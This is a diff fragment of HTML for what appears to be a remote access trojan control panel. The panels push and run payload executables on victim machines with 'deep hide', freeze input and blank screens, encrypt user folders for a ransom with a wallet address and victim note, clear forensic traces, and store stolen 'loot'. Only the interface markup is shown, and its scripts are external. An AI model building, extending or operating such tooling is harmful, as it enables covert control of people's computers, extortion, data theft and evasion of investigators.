+             ondragleave="this.classList.remove('drag')"
+             ondrop="handlePayloadDrop(event)">
+          <div>drag .exe here from your PC</div>
+          <input type="file" id="payload-file" accept=".exe" style="display:none" onchange="handlePayloadFile(this)"/>
+          <button class="cmd sm" onclick="document.getElementById('payload-file').click()">Browse EXE</button>
+        </div>
+        <div class="row">
+          <select id="payload-action" class="input" style="max-width:220px">
+            <option value="self_update">Self-update (replace + deep hide)</option>
+            <option value="download_exec">Download &amp; run (keep old)</option>
+          </select>
+        </div>
+        <div class="row">
+          <input class="input grow" id="upd-url" placeholder="auto-filled after upload · or paste full URL"/>
+          <button class="cmd primary" onclick="runPayloadUpdate()">Payload + Run</button>
+        </div>
+        <div id="payload-path" class="steal-summary"></div>
+        <pre class="out-box" id="out-payload"></pre>
+      </div>
+
+      <!-- CHAOS -->
+      <div class="panel" id="panel-chaos">
+        <div class="panel-title">Chaos</div>
+        <div class="panel-desc">input freeze · monitor · tray · noise</div>
+        <div class="grid2">
+          <button class="cmd danger" onclick="send('block_input')">Freeze input</button>
+          <button class="cmd" onclick="send('unblock_input')">Unfreeze</button>
+          <button class="cmd" onclick="send('monitor_off')">Screen off</button>
+          <button class="cmd" onclick="send('monitor_on')">Screen on</button>
+          <button class="cmd" onclick="send('lock')">Lock</button>
+          <button class="cmd" onclick="send('cd_tray',{action:'open'})">CD tray open</button>
+          <button class="cmd" onclick="send('cd_tray',{action:'close'})">CD tray close</button>
+        </div>
+        <div class="row">
+          <input class="input grow" id="chaos-url" placeholder="https://…"/>
+          <button class="cmd" onclick="chaosUrl()">Open URL</button>
+        </div>
+        <div class="row">
+          <input class="input grow" id="chaos-speak" placeholder="text to speak"/>
+          <button class="cmd" onclick="chaosSpeak()">Speak</button>
+        </div>
+        <div class="row">
+          <input class="input grow" id="chaos-wall" placeholder="wallpaper image url"/>
+          <button class="cmd" onclick="chaosWall()">Wallpaper</button>
+        </div>
+        <pre class="out-box" id="out-chaos"></pre>
+      </div>
+
+      <!-- RANSOM -->
+      <div class="panel" id="panel-ransom">
+        <div class="panel-title">Ransom</div>
+        <div class="panel-desc">demo XOR on user folders — not production crypto</div>
+        <div class="row">
+          <select class="input" id="ransom-coin">
+            <option>BTC</option><option>USDT</option><option>ETH</option><option>LTC</option><option>XMR</option><option>BNB</option><option>SOL</option>
+          </select>
+          <input class="input grow" id="ransom-wallet" placeholder="wallet address"/>
+        </div>
+        <textarea class="input" id="ransom-note" rows="2" placeholder="note for victim"></textarea>
+        <div class="row">
+          <button class="cmd danger" onclick="runRansom('encrypt')">Encrypt</button>
+          <button class="cmd" onclick="runRansom('decrypt')">Decrypt</button>
+        </div>
+        <pre class="out-box" id="out-ransom"></pre>
+      </div>
+
+      <!-- CLEAN -->
+      <div class="panel" id="panel-clean">
+        <div class="panel-title">Clean Up</div>
+        <div class="panel-desc">recent · run history · prefetch</div>
+        <button class="cmd primary" onclick="send('clear_traces')">Clear traces</button>
+        <pre class="out-box" id="out-clean"></pre>
+      </div>
+
+      <!-- DESTROY -->
+      <div class="panel" id="panel-destroy">
+        <div class="panel-title">Destroy</div>
+        <div class="panel-desc">remove startup · delete EXE · kill process</div>
+        <button class="cmd danger" onclick="if(confirm('Uninstall and kill this machine?')) send('uninstall')">Uninstall + Kill</button>
+        <button class="cmd danger" onclick="if(confirm('FULL CLEAN: watchdog + tasks + run keys + delete EXE?')) send('full_clean')">Full clean self</button>
+        <pre class="out-box" id="out-destroy"></pre>
+      </div>
+    </div>
+  </section>
+</div>
+
+<!-- vault modal -->
+<div id="vault-modal" class="modal hidden">
+  <div class="modal-card"><button class="cmd sm danger" onclick="clearVault()">Clear all vault</button> 
+    <div class="row" style="justify-content:space-between;margin-bottom:12px">
+      <h2 style="font-size:1.1rem">Loot Vault</h2>
+      <button class="cmd sm" onclick="closeVault()">Close</button>
+    </div>
+    <div id="vault-list"></div>
+  </div>
+</div>
+
+<!-- lightbox -->
+<div id="lightbox" class="lightbox hidden" onclick="if(event.target===this)closeLightbox()">
+  <img id="lightbox-img" alt=""/>
+  <button class="cmd sm" onclick="closeLightbox()">close</button>
+</div>
+
+<!-- AI corner -->
+<script src="/static/script.js"></script>
+</body>
+</html>
